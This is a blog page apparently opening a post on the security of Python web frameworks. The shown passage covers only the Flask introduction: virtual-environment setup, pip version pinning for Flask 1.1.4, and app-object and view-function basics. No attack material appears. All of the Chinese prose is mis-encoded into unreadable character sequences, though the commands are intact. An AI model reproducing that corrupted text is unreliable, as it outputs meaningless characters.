<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/12/python å¸¸è§æ¡†æ¶å®‰å…¨/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Python å¸¸è§æ¡†æ¶å®‰å…¨ | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["ä¹¦æœ‰æœªæ›¾ç»æˆ‘è¯»ï¼Œäº‹æ— ä¸å¯å¯¹äººè¨€"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"åˆ†ç±»":{"icon":"fa-solid fa-folder","path":"/categories/"},"æ ‡ç­¾":{"icon":"fa-solid fa-tags","path":"/tags/"},"ä¹¦ç­¾":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    ä¹¦ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                ä¹¦ç­¾
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python å¸¸è§æ¡†æ¶å®‰å…¨</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-12 00:26:57</span>
        <span class="mobile">2025-08-12 00:26:57</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 01:12:24</span>
            <span class="mobile">2025-08-19 01:12:24</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/python-web/">python web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/python-web/">python web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>11.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>49 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><p>Flask æ˜¯ä¸€ä¸ª <strong>è½»é‡çº§çš„ Python Web æ¡†æ¶</strong>ï¼Œä»¥â€œå¾®å†…æ ¸ + æ‰©å±•â€çš„ç†å¿µè‘—ç§°ã€‚å®ƒæœ¬èº«åªæä¾› <strong>è·¯ç”±ã€è¯·æ±‚&#x2F;å“åº”ã€æ¨¡æ¿æ¸²æŸ“</strong> ç­‰æœ€æ ¸å¿ƒåŠŸèƒ½ï¼Œå…¶ä»–å¦‚æ•°æ®åº“ã€è®¤è¯ã€è¡¨å•æ ¡éªŒã€è¿ç§»ã€ç¼“å­˜ç­‰éƒ½é€šè¿‡ <strong>æ‰©å±•ï¼ˆextensionsï¼‰</strong> æ¥æŒ‰éœ€æ‹¼è£…ã€‚</p>
<p>æ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li><strong>Werkzeug</strong>ï¼šWSGI å·¥å…·é›†ï¼ˆè¯·æ±‚ä¸å“åº”ã€è·¯ç”±ã€è°ƒè¯•å™¨ï¼‰ã€‚</li>
<li><strong>Jinja2</strong>ï¼šæ¨¡æ¿å¼•æ“ï¼ˆHTML æ¸²æŸ“ï¼‰ã€‚</li>
<li><strong>Flask Core</strong>ï¼šåº”ç”¨å¯¹è±¡ã€ä¸Šä¸‹æ–‡ã€è“å›¾ã€é…ç½®ã€ä¿¡å·ç­‰ã€‚</li>
</ul>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç”±äºæˆ‘ä»¬åœ¨ç ”ç©¶ Flask æ¡†æ¶å®‰å…¨çš„æ—¶å€™éœ€è¦å¤šæ¬¡åˆ‡æ¢ç‰ˆæœ¬ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬é€šè¿‡ Python è™šæ‹Ÿç¯å¢ƒï¼ˆ<code>.venv</code>ï¼‰ç®¡ç† Flask ç‰ˆæœ¬ã€‚</p>
<blockquote>
<p><code>.venv</code> æ˜¯ Python <strong>è™šæ‹Ÿç¯å¢ƒ</strong>ç›®å½•ï¼Œå†…å«ç‹¬ç«‹çš„ Python è§£é‡Šå™¨å’Œä¾èµ–åŒ…ç®¡ç†ç©ºé—´ã€‚</p>
<p>ä½œç”¨ï¼š</p>
<ul>
<li><strong>éš”ç¦»é¡¹ç›®ä¾èµ–</strong>ï¼šä¸åŒé¡¹ç›®å¯ä»¥ä½¿ç”¨ä¸åŒçš„ Flask ç‰ˆæœ¬ã€‚</li>
<li><strong>é¿å…å…¨å±€æ±¡æŸ“</strong>ï¼šä¸ä¼šå½±å“ç³»ç»Ÿå…¨å±€çš„ Python åŒ…ã€‚</li>
<li><strong>ä¾¿äºç‰ˆæœ¬åˆ‡æ¢</strong>ï¼šåŒä¸€ä¸ªé¡¹ç›®å†…å¯éšæ—¶å‡çº§æˆ–é™çº§ Flaskã€‚</li>
</ul>
</blockquote>
<h3 id="åˆ›å»ºä¸æ¿€æ´»-venv"><a href="#åˆ›å»ºä¸æ¿€æ´»-venv" class="headerlink" title="åˆ›å»ºä¸æ¿€æ´» .venv"></a>åˆ›å»ºä¸æ¿€æ´» <code>.venv</code></h3><p>åˆ›å»º <code>.venv</code>ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3.10-venv</span><br><span class="line">python -m pip install virtualenv</span><br><span class="line">python -m venv .venv</span><br></pre></td></tr></table></figure></div>

<p>æ¿€æ´»åå‘½ä»¤è¡Œå‰é¢ä¼šå‡ºç° <code>(.venv)</code> æ ‡è®°ï¼Œè¡¨ç¤ºå½“å‰æ“ä½œä»…ä½œç”¨äºè™šæ‹Ÿç¯å¢ƒã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># macOS / Linux</span></span><br><span class="line"><span class="built_in">source</span> .venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">.venv\Scripts\activate</span><br></pre></td></tr></table></figure></div>

<h3 id="å®‰è£…-Flask"><a href="#å®‰è£…-Flask" class="headerlink" title="å®‰è£… Flask"></a>å®‰è£… Flask</h3><p>æŸ¥çœ‹å¯å®‰è£…çš„ Flask ç‰ˆæœ¬ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip index versions flask</span><br></pre></td></tr></table></figure></div>

<p>å¸¸ç”¨å®‰è£…å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…æœ€æ–°ç‰ˆ</span></span><br><span class="line">pip install flask</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…æŒ‡å®šç‰ˆæœ¬ï¼ˆå¦‚ 2.0.3ï¼‰</span></span><br><span class="line">pip install flask==<span class="number">2.0</span><span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…å°äºæŸä¸ªç‰ˆæœ¬</span></span><br><span class="line">pip install <span class="string">&quot;flask&lt;2.1&quot;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ‡æ¢-Flask-ç‰ˆæœ¬"><a href="#åˆ‡æ¢-Flask-ç‰ˆæœ¬" class="headerlink" title="åˆ‡æ¢ Flask ç‰ˆæœ¬"></a>åˆ‡æ¢ Flask ç‰ˆæœ¬</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‡çº§åˆ°æŒ‡å®šç‰ˆæœ¬</span></span><br><span class="line">pip install --upgrade flask==<span class="number">2.3</span><span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é™çº§åˆ°è€ç‰ˆæœ¬</span></span><br><span class="line">pip install flask==<span class="number">1.1</span><span class="number">.4</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ä¸Šè¿°å‘½ä»¤åœ¨å®‰è£… <code>flask==1.1.4</code> åè¿è¡Œ Flask é¡¹ç›®ä¼šæŠ¥é”™ã€‚</p>
<p>è¿™æ˜¯å› ä¸º <strong>pip åªçœ‹åŒ…å£°æ˜çš„â€œç‰ˆæœ¬çº¦æŸâ€ï¼Œä¸ä¼šå¸®ä½ åˆ¤æ–­â€œçœŸå®è¿è¡Œæ—¶å…¼å®¹æ€§â€</strong>ã€‚è€Œ Flask 1.1.4 â†’ Jinja2 2.11.3 â†’ MarkupSafe çš„è¿™æ¡é“¾ï¼Œ<strong>å£°æ˜çš„çº¦æŸè¿‡äºå®½æ¾</strong>ï¼Œå¯¼è‡´ pip é€‰äº†â€œçœ‹èµ·æ¥æ»¡è¶³è¦æ±‚ã€ä½†å®é™…ä¸Šä¼šå´©â€çš„ç»„åˆã€‚</p>
<p>å…·ä½“æ¥è¯´å°±æ˜¯ï¼š</p>
<ul>
<li>Flask 1.1.4 ä¾èµ–ï¼š<code>Jinja2&lt;3.0,&gt;=2.10.1</code></li>
<li>Jinja2 2.11.3 ä¾èµ–ï¼š<code>MarkupSafe&gt;=0.23</code>ï¼ˆ<strong>æ²¡æœ‰ä¸Šé™ï¼</strong>ï¼‰</li>
<li>MarkupSafe åœ¨ **2.1 èµ·ç§»é™¤äº† <code>soft_unicode</code>**ã€‚</li>
<li>Jinja2 2.11.3 ä»ä¼š <code>from markupsafe import soft_unicode</code> â†’ åœ¨ <code>MarkupSafe â‰¥2.1</code> ç›´æ¥ <code>ImportError</code>ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>å£°æ˜å…è®¸</strong> <code>MarkupSafe==3.0.2</code>ï¼Œä½†<strong>å®é™…ä¸å…¼å®¹</strong>ã€‚pip çš„æ–°è§£æå™¨èƒ½è§£â€œå£°æ˜çš„å†²çªâ€ï¼Œè§£ä¸äº†â€œè¿è¡Œæ—¶ API å˜åŒ–â€çš„å†²çªã€‚</p>
<p>è§£å†³æ–¹æ³•æ˜¯æ‰‹åŠ¨å›ºå®šè€ç‰ˆæœ¬ä¾èµ–ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade --force-reinstall \</span><br><span class="line">  <span class="string">&quot;flask==1.1.4&quot;</span> \</span><br><span class="line">  <span class="string">&quot;jinja2==2.11.3&quot;</span> \</span><br><span class="line">  <span class="string">&quot;markupsafe==2.0.1&quot;</span> \</span><br><span class="line">  <span class="string">&quot;werkzeug==1.0.1&quot;</span> \</span><br><span class="line">  <span class="string">&quot;click==7.1.2&quot;</span> \</span><br><span class="line">  <span class="string">&quot;itsdangerous==1.1.0&quot;</span></span><br><span class="line"></span><br><span class="line">python -m pip check   <span class="comment"># éªŒè¯æ˜¯å¦è¿˜æœ‰å†²çª</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="å›ºå®šä¾èµ–"><a href="#å›ºå®šä¾èµ–" class="headerlink" title="å›ºå®šä¾èµ–"></a>å›ºå®šä¾èµ–</h3><p>ç”Ÿæˆä¾èµ–æ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure></div>

<p>æ¢å¤ä¾èµ–ç¯å¢ƒï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></div>

<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="åº”ç”¨å¯¹è±¡ï¼ˆApplication-Objectï¼‰"><a href="#åº”ç”¨å¯¹è±¡ï¼ˆApplication-Objectï¼‰" class="headerlink" title="åº”ç”¨å¯¹è±¡ï¼ˆApplication Objectï¼‰"></a>åº”ç”¨å¯¹è±¡ï¼ˆApplication Objectï¼‰</h3><p>åº”ç”¨å¯¹è±¡æ˜¯æ•´ä¸ª Flask é¡¹ç›®çš„å…¥å£ä¸æ ¸å¿ƒï¼Œè´Ÿè´£ç®¡ç†è·¯ç”±ã€é…ç½®ã€æ‰©å±•æ³¨å†Œç­‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)  <span class="comment"># __name__ ç”¨äºå®šä½é™æ€æ–‡ä»¶å’Œæ¨¡æ¿çš„è·¯å¾„</span></span><br></pre></td></tr></table></figure></div>

<p><strong>ç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¸€ä¸ªç½‘ç«™å°±æ˜¯ä¸€ä¸ª Flask åº”ç”¨å®ä¾‹</strong>ã€‚æ‰€æœ‰è·¯ç”±ã€é…ç½®ã€æ’ä»¶éƒ½æŒ‚åœ¨è¿™ä¸ªå®ä¾‹ä¸Šã€‚å¯åŠ¨æ—¶ <code>app.run()</code> å°±æŠŠè¿™ä¸ªç½‘ç«™è·‘èµ·æ¥ã€‚</p>
<h3 id="è§†å›¾å‡½æ•°ï¼ˆView-Functionï¼‰"><a href="#è§†å›¾å‡½æ•°ï¼ˆView-Functionï¼‰" class="headerlink" title="è§†å›¾å‡½æ•°ï¼ˆView Functionï¼‰"></a>è§†å›¾å‡½æ•°ï¼ˆView Functionï¼‰</h3><p> <strong>è§†å›¾å‡½æ•°ï¼ˆView Functionï¼‰</strong> å°±æ˜¯ <strong>Flask ä¸­ç”¨æ¥å¤„ç†æŸä¸ª URL è¯·æ±‚çš„ Python å‡½æ•°</strong>ã€‚</p>
<ul>
<li>å½“æµè§ˆå™¨ï¼ˆæˆ–å®¢æˆ·ç«¯ï¼‰è®¿é—®ä¸€ä¸ª URL æ—¶ï¼ŒFlask ä¼šæ ¹æ®è·¯ç”±è§„åˆ™æ‰¾åˆ°å¯¹åº”çš„è§†å›¾å‡½æ•°ï¼Œå¹¶æ‰§è¡Œå®ƒã€‚</li>
